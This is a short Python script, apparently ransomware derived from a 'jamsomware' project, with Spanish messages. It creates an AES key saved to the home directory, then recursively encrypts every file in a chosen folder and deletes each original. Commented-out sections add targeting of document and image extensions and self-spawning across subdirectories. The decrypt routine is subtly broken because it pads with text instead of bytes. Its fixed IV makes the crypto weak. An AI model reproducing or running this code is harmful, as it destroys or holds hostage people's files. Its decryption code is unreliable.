#!/usr/bin/python3
# coding: ascii

# Basado en https://github.com/julupu/jamsomware

from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Random.random import *
import argparse
import os
import subprocess
import sys
import time




class Log:
    def write(self, msg):
        print(msg)


class JamCrypt:
    KEY_SIZE = 32
    BLOCK_SIZE = 16
    KEYFILE = os.path.join(os.path.expanduser("~"), "jam.key")
    key = None

    def __init__(self, key):
        self.rndfile = Random.new()
        if key == None:
            self.key = self.rndfile.read(self.KEY_SIZE)
            keyfile = open(self.KEYFILE, 'wb');
            keyfile.write(self.key)
        else:
            self.key = key
        self.IV = b"jamsomwareiscool"

    def encrypt(self, src):
        infile = open(src, 'rb')
        outfile = open(src + ".enc", 'wb')
        cipher = AES.new(self.key, AES.MODE_CBC, self.IV)

        while True:
            block = infile.read(self.BLOCK_SIZE)
            if len(block) == 0:
                break
            elif len(block) % 16 != 0:
                block += b' '  * (16-len(block) % 16)

            outfile.write(cipher.encrypt(block))

    def decrypt(self, src):
        infile = open(src, 'rb')
        outfile = open(src + ".dec", 'wb')
        cipher = AES.new(self.key, AES.MODE_CBC, self.IV)

        while True:
            block = infile.read(self.BLOCK_SIZE)
            if len(block) == 0:
                break
            elif len(block) % 16 != 0:
                block += ' '  * (16-len(block) % 16)

            outfile.write(cipher.decrypt(block))



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    #parser.add_argument('-d', '--decrypt', nargs=1)
    #parser.add_argument('-e', '--encrypt', nargs=1)
    parser.add_argument('-k', '--key', nargs=1)
    # parser.add_argument('--clean', action="store_true", default=False)
    parser.add_argument('--dir', nargs=1)
    args = parser.parse_args()

    key = None
    dir = None
    # log = Log();
    # extensions = [".jpg", ".JPG", ".png", ".PNG", ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp"]


    if args.key:
        #key = args.key[0]
        keyfilehandle = open(args.key[0], 'rb')
        key = keyfilehandle.read(JamCrypt.KEY_SIZE)
		
    #if not args.key and args.decrypt:
    #    log.write("For decrypting you need to specify a key")
    #    sys.exit(1)

    if args.dir:
        dir = args.dir[0]
    else:
        print("Falta directorio")
        sys.exit(1)
        #dir = os.path.expanduser("~")

    #if args.clean:
    #    for root, dirs, files in os.walk(dir):
    #        for file in files:
    #            if file.endswith(".enc") or file.endswith(".dec"):
    #                log.write("Removing " + os.path.join(root, file))
    #                os.remove(os.path.join(root, file))
    #    sys.exit(0)

    crypt = JamCrypt(key)
    print(dir, key)

    #if args.decrypt:
    #    log.write("Decrypt " + args.decrypt[0])
    #    crypt.decrypt(args.decrypt[0]) 
    #    sys.exit(0)
    for root, dirs, files in os.walk(dir):
        for file in files:
            print(os.path.join(root, file))
            crypt.encrypt(os.path.join(root, file))
            #crypt.decrypt(os.path.join(root, file))
            os.remove(os.path.join(root, file))

#    for file in os.listdir(dir):
#        sleep = 2 * random()
#        time.sleep(sleep)
#        pathfile = os.path.join(dir, file)
#
#        if os.path.isdir(pathfile):
#            if sys.argv[0].endswith(".py"):
#                subprocess.Popen(["python", sys.argv[0], "-k", keyfile, "--dir", pathfile])
#            else:
#                subprocess.Popen([sys.argv[0], "-k", keyfile, "--dir", pathfile])
#            log.write(sys.argv[0])
#        elif file.endswith(tuple(extensions)):
#            crypt.encrypt(pathfile)
#            os.remove(pathfile)
#        else:
#            pass